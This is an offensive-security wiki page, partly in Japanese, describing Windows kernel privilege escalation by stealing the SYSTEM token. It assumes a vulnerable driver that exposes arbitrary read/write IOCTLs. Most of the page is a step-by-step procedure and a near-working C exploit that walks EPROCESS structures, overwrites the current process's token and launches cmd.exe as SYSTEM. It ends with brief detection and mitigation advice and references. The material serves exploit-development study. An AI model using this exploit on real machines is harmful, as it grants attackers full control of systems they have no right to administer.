# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## 概要

If a vulnerable driver exposes an IOCTL that gives an attacker arbitrary kernel read and/or write primitives, elevating to NT AUTHORITY\SYSTEM can often be achieved by stealing a SYSTEM access token. The technique copies the Token pointer from a SYSTEM process’ EPROCESS into the current process’ EPROCESS.

なぜ動作するか:
- 各プロセスは EPROCESS 構造体を持ち、その中に（他のフィールドとともに）Token（実際にはトークンオブジェクトへの EX_FAST_REF）を含みます。
- SYSTEM プロセス（PID 4）は、すべての権限が有効なトークンを保持しています。
- 現在のプロセスの EPROCESS.Token を SYSTEM のトークンポインタで置き換えると、当該プロセスは即座に SYSTEM として実行されます。

> EPROCESS 内のオフセットは Windows のバージョンによって異なります。動的に決定する（symbols）か、バージョン固有の定数を使用してください。また、EPROCESS.Token は EX_FAST_REF であり、下位3ビットは参照カウントのフラグであることを忘れないでください。

## 高レベルの手順

1) Locate ntoskrnl.exe base and resolve the address of PsInitialSystemProcess.
- From user mode, use NtQuerySystemInformation(SystemModuleInformation) or EnumDeviceDrivers to get loaded driver bases.
- Add the offset of PsInitialSystemProcess (from symbols/reversing) to the kernel base to get its address.
2) Read the pointer at PsInitialSystemProcess → this is a kernel pointer to SYSTEM’s EPROCESS.
3) From SYSTEM EPROCESS, read UniqueProcessId and ActiveProcessLinks offsets to traverse the doubly linked list of EPROCESS structures (ActiveProcessLinks.Flink/Blink) until you find the EPROCESS whose UniqueProcessId equals GetCurrentProcessId(). Keep both:
- EPROCESS_SYSTEM (for SYSTEM)
- EPROCESS_SELF (for the current process)
4) Read SYSTEM token value: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Mask out the low 3 bits: Token_SYS_masked = Token_SYS & ~0xF (commonly ~0xF or ~0x7 depending on build; on x64 the low 3 bits are used — 0xFFFFFFFFFFFFFFF8 mask).
5) Option A (common): Preserve the low 3 bits from your current token and splice them onto SYSTEM’s pointer to keep the embedded ref count consistent.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Write Token_NEW back into (EPROCESS_SELF + TokenOffset) using your kernel write primitive.
7) Your current process is now SYSTEM. Optionally spawn a new cmd.exe or powershell.exe to confirm.

## 擬似コード

Below is a skeleton that only uses two IOCTLs from a vulnerable driver, one for 8-byte kernel read and one for 8-byte kernel write. Replace with your driver’s interface.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
注意事項:
- オフセット: WinDbg’s `dt nt!_EPROCESS` をターゲットの PDBs、または runtime symbol loader と一緒に使って正しいオフセットを取得してください。盲目的にハードコードしないでください。
- マスク: x64 では token は `EX_FAST_REF` です；下位3ビットが参照カウントのビットになっています。token の元の下位ビットを保持することで即時の参照カウント不整合を避けられます。
- 安定性: 現在のプロセスを昇格することを優先してください；短命なヘルパーを昇格させると、それが終了したときに SYSTEM を失う可能性があります。

## 検出と緩和
- 強力な IOCTLs を公開する署名されていない、または信頼できないサードパーティ製ドライバの読み込みが根本原因です。
- Kernel Driver Blocklist (HVCI/CI)、DeviceGuard、および Attack Surface Reduction ルールは脆弱なドライバの読み込みを防止できます。
- EDR は arbitrary read/write を実装する疑わしい IOCTL シーケンスや token swaps を監視できます。

## 参考
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
